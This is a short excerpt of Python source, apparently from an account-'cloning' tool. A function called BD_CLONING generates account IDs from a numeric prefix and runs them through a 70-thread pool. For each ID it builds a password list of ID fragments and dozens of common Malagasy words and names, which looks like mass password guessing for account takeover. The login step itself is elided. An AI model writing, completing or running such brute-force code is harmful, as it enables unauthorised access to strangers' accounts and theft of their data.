...
def BD_CLONING():
    ...
    with tred(max_workers=70) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'fitiavana','anjara','malala','zanako','mahery','sarika','safidy','felana','mamiko','papako','fitiavako','mamako','nirina','fanilo','nomena','malalako','sarobidy','heritina','faniry','nekena','koloina','mihary','tahiry','jesosy','valisoa','nilaina','nomena','tahiry','harena','riantsoa','bibity','finona','mahandry','valimbavaka','safidy','mahefa','Mahefa','mahandry','Mahandry','valimbavaka','Valimbavaka','fitiavako','anjarako','saholy','salohy','lalaina','tsilavina','tahina','anjara','nilaina','fanasina','hasina','jesosy','dadako','badoda','heritina','nomena','fandresena','finoana','fiderana','nantenaina','harena','tahiry','valisoa','tantely','tanjona','sarika','fanasina','felana','malalako','fanasina','mahery','seheno','santatra']
